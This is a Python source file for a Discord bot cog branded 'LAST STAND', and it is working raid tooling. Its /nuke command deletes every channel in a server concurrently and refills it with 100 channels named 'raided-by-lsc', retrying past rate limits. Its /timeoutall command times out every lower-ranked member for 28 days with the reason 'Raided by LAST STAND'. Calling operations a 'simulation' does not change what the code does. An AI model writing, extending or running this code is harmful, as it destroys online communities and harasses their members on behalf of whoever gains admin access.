"""
control.py — LAST STAND | /stop, /status, /nuke, /timeoutall, /setratelimit, /bypassstats
All commands have slash (/) and prefix (.) versions.
Raw direct discord.py calls — no bypass engine in hot paths.
"""

import asyncio
import datetime

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

RAID_TAG = "LAST STAND"


class Control(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /stop + .stop ──────────────────────────────────────────────────────────
    @app_commands.command(name="stop", description="Immediately stop all running operations.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def stop(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(self._do_stop())

    @commands.command(name="stop")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def stop_prefix(self, ctx: commands.Context) -> None:
        await ctx.send(self._do_stop())

    def _do_stop(self) -> str:
        if not bot_state.active_simulation and not bot_state.is_running():
            return "No operation is currently running."
        name  = bot_state.active_simulation or "unknown"
        count = len(bot_state.running_tasks)
        bot_state.stop_all()
        return (
            f"🛑 **Stopped — {RAID_TAG}**\n"
            f"┣ Operation : `{name}`\n"
            f"┗ Cancelled : `{count}` tasks"
        )

    # ── /status + .status ──────────────────────────────────────────────────────
    @app_commands.command(name="status", description="Show current operation status.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def status(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(self._do_status(), ephemeral=True)

    @commands.command(name="status")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def status_prefix(self, ctx: commands.Context) -> None:
        await ctx.send(self._do_status())

    def _do_status(self) -> str:
        if bot_state.active_simulation:
            return (
                f"📊 **Running: `{bot_state.active_simulation}`** — {RAID_TAG}\n"
                f"┗ Active tasks: `{len(bot_state.running_tasks)}`"
            )
        return f"📊 **Idle** — {RAID_TAG}\n┗ Active tasks: `{len(bot_state.running_tasks)}`"

    # ── /setratelimit + .setratelimit ──────────────────────────────────────────
    @app_commands.command(name="setratelimit", description="Change intensity live (1–10). Cosmetic only — bot now runs raw.")
    @app_commands.describe(level="1–10")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def setratelimit(self, interaction: discord.Interaction, level: int) -> None:
        await interaction.response.send_message(self._do_setratelimit(level), ephemeral=True)

    @commands.command(name="setratelimit", aliases=["setrl"])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def setratelimit_prefix(self, ctx: commands.Context, level: int = 10) -> None:
        await ctx.send(self._do_setratelimit(level))

    def _do_setratelimit(self, level: int) -> str:
        if not 1 <= level <= 10:
            return "❌ Level must be 1–10."
        bot_state.rate_controller.set_intensity(level)
        return f"⚙️ Intensity set to `{level}/10` (bot runs raw — no artificial delays)."

    # ── /bypassstats + .bypassstats ────────────────────────────────────────────
    @app_commands.command(name="bypassstats", description="Show task and operation stats.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def bypassstats(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(self._do_stats(), ephemeral=True)

    @commands.command(name="bypassstats", aliases=["bpstats"])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def bypassstats_prefix(self, ctx: commands.Context) -> None:
        await ctx.send(self._do_stats())

    def _do_stats(self) -> str:
        return (
            f"📊 **Stats — {RAID_TAG}**\n"
            f"```\n"
            f"Operation    : {bot_state.active_simulation or 'idle'}\n"
            f"Active tasks : {len(bot_state.running_tasks)}\n"
            f"```"
        )

    # ── /nuke + .nuke ──────────────────────────────────────────────────────────
    @app_commands.command(name="nuke", description="☢️ Delete every channel instantly, optionally rebuild with flood channels.")
    @app_commands.describe(rebuild="Create 100 flood channels after nuking. Default True.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def nuke(self, interaction: discord.Interaction, rebuild: bool = True) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** running — use `/stop` first.", ephemeral=True
            )
            return
        guild    = interaction.guild
        channels = list(guild.channels)
        self._start_nuke(guild, channels, rebuild)
        await interaction.response.send_message(
            f"☢️ **NUKE — {RAID_TAG}**\n"
            f"┣ Deleting : `{len(channels)}` channels\n"
            f"┗ Rebuild  : `{'✅ 100 flood channels' if rebuild else '❌'}`"
        )

    @commands.command(name="nuke")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def nuke_prefix(self, ctx: commands.Context, rebuild: str = "true") -> None:
        if bot_state.active_simulation:
            await ctx.send(f"⚠️ **{bot_state.active_simulation}** running — use `.stop` first.")
            return
        guild      = ctx.guild
        channels   = list(guild.channels)
        do_rebuild = rebuild.lower() not in ("false", "no", "0")
        self._start_nuke(guild, channels, do_rebuild)
        await ctx.send(
            f"☢️ **NUKE — {RAID_TAG}**\n"
            f"┣ Deleting : `{len(channels)}` channels\n"
            f"┗ Rebuild  : `{'✅ 100 flood channels' if do_rebuild else '❌'}`"
        )

    def _start_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
        bot_state.reset()
        bot_state.active_simulation = "nuke"
        bot_state.add_task(asyncio.create_task(self._run_nuke(guild, channels, rebuild)))

    async def _run_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
        se  = bot_state.stop_event
        sem = asyncio.Semaphore(40)

        async def _del(ch):
            async with sem:
                try:
                    await ch.delete()
                except discord.NotFound:
                    pass
                except discord.HTTPException as e:
                    if e.status == 429:
                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                        try:
                            await ch.delete()
                        except Exception:
                            pass
                except Exception:
                    pass

        try:
            await asyncio.gather(*[_del(ch) for ch in channels], return_exceptions=True)

            if rebuild and not se.is_set():
                await asyncio.sleep(1.0)
                for i in range(100):
                    if se.is_set():
                        break
                    try:
                        await guild.create_text_channel(f"raided-by-lsc-{i:03d}")
                    except discord.HTTPException as e:
                        if e.status == 429:
                            await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                    except Exception:
                        pass
                    await asyncio.sleep(0.55)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[nuke] crashed: {e}", flush=True)
        finally:
            if bot_state.active_simulation == "nuke":
                bot_state.active_simulation = None

    # ── /timeoutall + .timeoutall ──────────────────────────────────────────────
    @app_commands.command(name="timeoutall", description="⏱️ Timeout every member for 28 days.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def timeoutall(self, interaction: discord.Interaction) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** running — use `/stop` first.", ephemeral=True
            )
            return
        await interaction.response.defer()
        await self._run_timeoutall(interaction.guild, interaction.user.id, interaction.followup.send)

    @commands.command(name="timeoutall", aliases=["toa"])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def timeoutall_prefix(self, ctx: commands.Context) -> None:
        if bot_state.active_simulation:
            await ctx.send(f"⚠️ **{bot_state.active_simulation}** running — use `.stop` first.")
            return
        await self._run_timeoutall(ctx.guild, ctx.author.id, ctx.send)

    async def _run_timeoutall(self, guild: discord.Guild, invoker_id: int, reply) -> None:
        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception:
            pass

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]

        if not targets:
            await reply("No eligible members found.")
            return

        bot_state.reset()
        bot_state.active_simulation = "timeoutall"

        await reply(
            f"⏱️ **MASS TIMEOUT — {RAID_TAG}**\n"
            f"┣ Targets  : `{len(targets)}`\n"
            f"┣ Duration : `28 days`\n"
            f"┗ `/stop` or `.stop` halts immediately."
        )

        bot_state.add_task(asyncio.create_task(self._do_timeout(targets)))

    async def _do_timeout(self, members: list[discord.Member]) -> None:
        se  = bot_state.stop_event
        sem = asyncio.Semaphore(25)
        dur = datetime.timedelta(days=28)

        async def _one(m):
            async with sem:
                if se.is_set():
                    return
                try:
                    await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        try:
            await asyncio.gather(*[_one(m) for m in members], return_exceptions=True)
        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "timeoutall":
                bot_state.active_simulation = None

    # ── error handlers ─────────────────────────────────────────────────────────
    @stop.error
    @status.error
    @setratelimit.error
    @bypassstats.error
    @nuke.error
    @timeoutall.error
    async def _cmd_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = (
            "❌ You need **Administrator** permission."
            if isinstance(error, app_commands.MissingPermissions)
            else f"❌ {error}"
        )
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Control(bot))
